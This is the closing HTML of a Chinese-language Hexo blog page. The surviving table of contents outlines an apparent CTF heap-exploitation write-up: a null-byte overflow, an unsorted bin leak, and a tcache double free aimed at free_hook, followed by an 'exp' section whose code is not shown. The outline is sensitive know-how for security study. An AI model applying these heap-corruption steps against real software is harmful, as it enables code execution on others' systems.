href="#%E9%A6%96%E5%85%88%E5%88%A9%E7%94%A8%E5%A0%86%E5%9D%97%E5%90%88%E5%B9%B6%E6%94%B9%E5%86%99pre-size"><span class="toc-number">3.1.</span> <span class="toc-text">首先利用堆块合并改写pre_size</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#null-byte-overflow%E6%BC%8F%E6%B4%9E%E8%A6%86%E7%9B%96inuse%E6%A0%87%E5%BF%97%E4%BD%8D"><span class="toc-number">3.2.</span> <span class="toc-text">null-byte-overflow漏洞覆盖inuse标志位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2unsorted-bin%E5%9C%B0%E5%9D%80"><span class="toc-number">3.3.</span> <span class="toc-text">泄露unsorted bin地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BADouble-Free%EF%BC%8C%E5%B0%86free-hook%E6%8C%82%E8%BF%9Btcache-bin"><span class="toc-number">3.4.</span> <span class="toc-text">构建Double Free，将free_hook挂进tcache bin</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By chuwei</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
